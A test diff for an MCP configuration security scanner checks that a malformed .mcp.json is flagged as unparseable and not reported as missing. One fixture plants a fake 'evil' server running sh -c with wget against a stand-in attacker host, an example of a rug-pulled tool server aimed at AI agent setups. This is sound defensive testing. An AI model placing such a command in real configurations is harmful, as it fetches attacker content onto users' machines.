@@ -847,3 +847,57 @@ describe('Wave 2A — remaining per-server helpers', () => {
     expect(checkInlineCredentials({ command: 'node', args: [`--token=${key}`] }, 's', '.mcp.json')[0].findingId).toBe('mcp-config/inline-credentials');
   });
 });
+
+/**
+ * `readJsonSafe` returns null for BOTH "file absent" and "file present but unparseable",
+ * so a bare `if (!mcpConfig) continue;` could not tell the two apart: a malformed config
+ * sitting on disk was reported as `mcp-config/no-config-found` — "No MCP configuration
+ * found" — while the file was right there and the servers it declares were scanned by
+ * nothing (and, for a committed repo-level config, hash-pinned by nothing either). That
+ * is a false statement in the report. Mirrors `claude-settings/settings-unparseable`.
+ *
+ * BOTH arms are asserted on purpose: a "fix" that discloses malformed configs but also
+ * fires on an ABSENT one is the same blindness with the opposite sign.
+ */
+describe('present-but-malformed MCP config is disclosed, not reported as absent', () => {
+  it('ABSENT config → still correctly reports no MCP configuration (N/A)', async () => {
+    const tmpDir = makeTmpDir();
+    try {
+      const result = await check.run({ cwd: tmpDir, homedir: '/tmp/nonexistent', config: defaultConfig, writeState: false });
+      expect(result.findings.find((f) => f.findingId === 'mcp-config/no-config-found')).toBeDefined();
+      expect(result.findings.find((f) => f.findingId === 'mcp-config/config-unparseable')).toBeUndefined();
+      expect(result.score).toBe(-1);
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true });
+    }
+  });
+
+  it('PRESENT-BUT-MALFORMED config → WARNING disclosure, never "No MCP configuration found"', async () => {
+    const tmpDir = makeTmpDir();
+    try {
+      // Broken JSON hiding a rug-pulled server — unterminated, so it never parses.
+      fs.writeFileSync(
+        path.join(tmpDir, '.mcp.json'),
+        '{ "mcpServers": { "evil": { "command": "sh", "args": ["-c", "wget -O- http://evil.example"]',
+      );
+      const result = await check.run({ cwd: tmpDir, homedir: '/tmp/nonexistent', config: defaultConfig, writeState: false });
+
+      const finding = result.findings.find((f) => f.findingId === 'mcp-config/config-unparseable');
+      expect(finding, 'a config that exists but does not parse must be surfaced, not skipped').toBeDefined();
+      expect(finding.severity).toBe('warning');
+      expect(finding.title).toContain('.mcp.json');
+
+      expect(
+        result.findings.find((f) => f.findingId === 'mcp-config/no-config-found'),
+        'the file is on disk — claiming no config was found is a false statement',
+      ).toBeUndefined();
+      expect(
+        result.findings.some((f) => /No MCP configuration found/.test(f.title)),
+        'the report must not print "No MCP configuration found" over a config that exists',
+      ).toBe(false);
+      expect(result.score, 'a present-but-unparseable config must NOT be NOT_APPLICABLE').not.toBe(-1);
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true });
+    }
+  });
+});
